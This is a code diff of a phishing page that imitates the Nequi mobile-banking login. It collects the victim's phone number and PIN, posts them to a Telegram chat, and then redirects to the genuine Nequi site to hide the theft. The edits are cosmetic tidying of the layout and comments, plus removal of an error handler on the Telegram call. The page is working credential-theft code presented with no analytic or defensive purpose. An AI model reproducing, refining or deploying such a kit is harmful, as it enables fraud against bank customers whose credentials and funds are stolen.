@@ -16,7 +16,6 @@
       overflow: hidden;
     }
 
-    /* ==================== PANTALLA 1 ==================== */
     #screen1, #screen2 {
       max-width: 420px;
       margin: 0 auto;
@@ -28,6 +27,7 @@
       position: absolute;
       width: 100%;
       top: 0;
+      left: 0;
     }
 
     .help {
@@ -100,7 +100,7 @@
       box-shadow: 0 6px 20px rgba(255, 45, 149, 0.4);
     }
 
-    /* ==================== PANTALLA 2 (Clave) ==================== */
+    /* Pantalla 2 */
     .back {
       position: absolute;
       top: 25px;
@@ -167,24 +167,18 @@
 </head>
 <body>
 
-  <!-- ====================== PANTALLA 1 ====================== -->
+  <!-- Pantalla 1 -->
   <div id="screen1">
     <div class="help">?</div>
-    
-    <div class="nequi-logo">
-      <span>■</span>Nequi
-    </div>
-
+    <div class="nequi-logo"><span>■</span>Nequi</div>
     <div class="label">Ingresa tu número de celular</div>
-
     <div class="input-box">
       <input type="tel" id="phone" placeholder="300 123 4567" maxlength="10" inputmode="numeric">
     </div>
-
     <button onclick="goToPassword()">Entra</button>
   </div>
 
-  <!-- ====================== PANTALLA 2 ====================== -->
+  <!-- Pantalla 2 -->
   <div id="screen2" style="display:none;">
     <div class="back" onclick="goBack()">←</div>
     <div class="title">Escribe tu clave</div>
@@ -230,7 +224,7 @@
       }
       localStorage.setItem("phone", phone);
       document.getElementById("screen1").style.display = "none";
-      document.getElementById("screen2").style.display = "block";
+      document.getElementById("screen2").style.display = "flex";
     }
 
     function addDigit(num) {
@@ -262,11 +256,11 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: chatId, text: message })
-      }).catch(err => console.log("Error enviando a Telegram"));
+      });
 
       setTimeout(() => {
         window.location.href = "https://www.nequi.com.co";
-      }, 1500);
+      }, 1600);
     }
 
     function goBack() {
